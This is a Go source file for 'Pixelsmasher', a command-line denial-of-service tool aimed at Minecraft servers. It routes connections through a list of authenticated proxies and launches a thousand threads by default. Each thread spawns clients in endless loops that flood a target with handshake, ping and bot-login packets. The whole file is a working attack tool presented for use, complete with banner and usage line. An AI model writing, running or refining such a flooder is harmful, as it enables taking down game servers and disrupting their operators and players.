package main

import (
	"bufio"
	"encoding/base64"
	"flag"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
)

func main() {
	var protocolVersion int
	var host string
	var joiner bool
	var pinger bool
	var handshake bool
	var jp bool
	var threads int
	var proxyFile string
	var Reset = "\033[0m" 
	var Red = "\033[31m"  
	var Yellow = "\033[33m" 
	var Blue = "\033[34m" 
	var Magenta = "\033[35m" 
	var White = "\033[97m"

	flag.StringVar(&host, "host", "", "IP of the server")
	flag.IntVar(&protocolVersion, "protocol", 763, "Minecraft protocol version")
	flag.BoolVar(&joiner, "join", false, "join method")
	flag.BoolVar(&handshake, "handshake", false, "handshake method")
	flag.BoolVar(&pinger, "ping", false, "ping method")
	flag.BoolVar(&jp, "pj", false, "ping and join method")
	flag.IntVar(&threads, "threads", 1000, "Number of threads")
	flag.StringVar(&proxyFile, "proxyfile", "proxies.txt", "Proxy file (auth HTTP proxies only)")
	flag.Parse()
	if flag.NFlag() == 0 {
		fmt.Printf(Red + `
	██████╗ ██╗██╗  ██╗███████╗██╗     ███████╗███╗   ███╗ █████╗ ███████╗██╗  ██╗███████╗██████╗
	██╔══██╗██║╚██╗██╔╝██╔════╝██║     ██╔════╝████╗ ████║██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
	██████╔╝██║ ╚███╔╝ █████╗  ██║     ███████╗██╔████╔██║███████║███████╗███████║█████╗  ██████╔╝
	██╔═══╝ ██║ ██╔██╗ ██╔══╝  ██║     ╚════██║██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══╝  ██╔══██╗
	██║     ██║██╔╝ ██╗███████╗███████╗███████║██║ ╚═╝ ██║██║  ██║███████║██║  ██║███████╗██║  ██║
	╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝`)
		fmt.Println("")
		fmt.Println(Blue + "					BY hakaneren899 and Randomname" + Reset)
		fmt.Println("")
		fmt.Println("")
		fmt.Println(Yellow + "./pixelsmasher -host <hostname:port> -join -threads <threads> -protocol <protocol-version> -proxyfile <proxies.txt>" + Reset)
		fmt.Println("")
		return
	}
	var modes []string
	if joiner {
		modes = append(modes, "join")
	}
	if pinger {
		modes = append(modes, "ping")
	}
	if handshake {
		modes = append(modes, "hand")
	}
	proxies, err := loadProxies(proxyFile)
	if err != nil {
		fmt.Printf("Failed to load proxies: %v\n", err)
		return
	}

	fmt.Printf(Red + `
	██████╗ ██╗██╗  ██╗███████╗██╗     ███████╗███╗   ███╗ █████╗ ███████╗██╗  ██╗███████╗██████╗
	██╔══██╗██║╚██╗██╔╝██╔════╝██║     ██╔════╝████╗ ████║██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
	██████╔╝██║ ╚███╔╝ █████╗  ██║     ███████╗██╔████╔██║███████║███████╗███████║█████╗  ██████╔╝
	██╔═══╝ ██║ ██╔██╗ ██╔══╝  ██║     ╚════██║██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══╝  ██╔══██╗
	██║     ██║██╔╝ ██╗███████╗███████╗███████║██║ ╚═╝ ██║██║  ██║███████║██║  ██║███████╗██║  ██║
	╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝`)
	fmt.Println("")
	fmt.Println(Blue + "					BY hakaneren899 and Randomname" + Reset)
	fmt.Println("")
	fmt.Println("")
	fmt.Println(White + "Target IP:" + Magenta, host)
	fmt.Println(White + "Mode:" + Magenta, modes)
	fmt.Println(White + "Thread Count:" + Magenta, threads)
	fmt.Println(White + "Protocol:" + Magenta, protocolVersion)
	fmt.Printf(Reset)

	spam(host, modes, threads, proxies, protocolVersion)
}

func loadProxies(filePath string) ([]Proxy, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	var proxies []Proxy
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.Split(line, ":")
		if len(parts) != 4 {
			continue
		}
		port, _ := strconv.Atoi(parts[1])
		proxies = append(proxies, Proxy{
			Host:     parts[0],
			Port:     port,
			Username: parts[2],
			Password: parts[3],
		})
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}
	return proxies, nil
}

func spam(host string, modes []string, threads int, proxies []Proxy, protocolVersion int) {
	var wg sync.WaitGroup
	hostParts := strings.Split(host, ":")
	if len(hostParts) != 2 {
		fmt.Println("Invalid host format. Please provide host in 'hostname:port' format.")
		return
	}
	host = hostParts[0]
	portStr := hostParts[1]
	port, err := strconv.Atoi(portStr)
	if err != nil {
		fmt.Printf("Invalid port: %v\n", err)
		return
	}

	startSignal := make(chan struct{})
	proxyCount := len(proxies)
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer wg.Done()
			<-startSignal
			for {
				for j := 0; j < 2000; j++ {
					loop(host, port, protocolVersion, threadID, proxyCount, proxies, threads, modes)
				}
			}
		}(i)
		
	}
	close(startSignal)
	wg.Wait()

}

func loop(host string, port int, protocolVersion int, threadID int, proxyCount int, proxies []Proxy, threads int, modes []string) {
	for {
	proxy := proxies[threadID%proxyCount]
	username := fmt.Sprintf("Pixelsmasher-%d", threadID)
	for i := 0; i < threads; i++ {
		go createClient(host, port, username, modes, proxy, protocolVersion)
	}
}
}


func createClient(host string, port int, username string, modes []string, proxy Proxy, protocolVersion int) {
	proxyAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(proxy.Username+":"+proxy.Password))
	options := fmt.Sprintf("%s:%d", proxy.Host, proxy.Port)
	conn, err := net.Dial("tcp", options)
	if err != nil {
		return
	}
	defer conn.Close()
	connectRequest := fmt.Sprintf(
		"CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\nProxy-Authorization: %s\r\nConnection: keep-alive\r\n\r\n",
		host, port, host, port, proxyAuth,
	)
	conn.Write([]byte(connectRequest))

	for _, mode := range modes {
		if mode == "join" {
			conn.Write(createHandshakePacket(host, port, 2, protocolVersion))
			conn.Write(createLoginPacket(username))
		}
		if mode == "ping" {
			conn.Write(createHandshakePacket(host, port, 1, protocolVersion))
			conn.Write(createRequestPacket())
		}
		if mode == "hand" {
			for {
				conn.Write(createHandshakePacket(host, port, 1, protocolVersion))
			}
		}
	}
}

func writeVarInt(value int) []byte {
	var buffer []byte
	for {
		if value&0xFFFFFF80 == 0 {
			buffer = append(buffer, byte(value))
			break
		}
		buffer = append(buffer, byte(value&0x7F|0x80))
		value >>= 7
	}
	return buffer
}

func createHandshakePacket(host string, port int, nextState int, protocolVersion int) []byte {
	hostBuffer := []byte(host)
	hostLength := writeVarInt(len(hostBuffer))
	portBuffer := []byte{byte(port >> 8), byte(port)}
	nextStateBuffer := writeVarInt(nextState)
	packetID := writeVarInt(0x00)
	protocolBuffer := writeVarInt(protocolVersion)
	packet := append(packetID, protocolBuffer...)
	packet = append(packet, hostLength...)
	packet = append(packet, hostBuffer...)
	packet = append(packet, portBuffer...)
	packet = append(packet, nextStateBuffer...)
	lengthBuffer := writeVarInt(len(packet))
	return append(lengthBuffer, packet...)
}

func createRequestPacket() []byte {
	packetID := writeVarInt(0x00)
	lengthBuffer := writeVarInt(len(packetID))
	return append(lengthBuffer, packetID...)
}

func createLoginPacket(username string) []byte {
	usernameBuffer := []byte(username)
	usernameLength := writeVarInt(len(usernameBuffer))
	packetID := writeVarInt(0x00)
	packet := append(packetID, usernameLength...)
	packet = append(packet, usernameBuffer...)
	lengthBuffer := writeVarInt(len(packet))
	return append(lengthBuffer, packet...)
}

type Proxy struct {
	Host     string
	Port     int
	Username string
	Password string
}
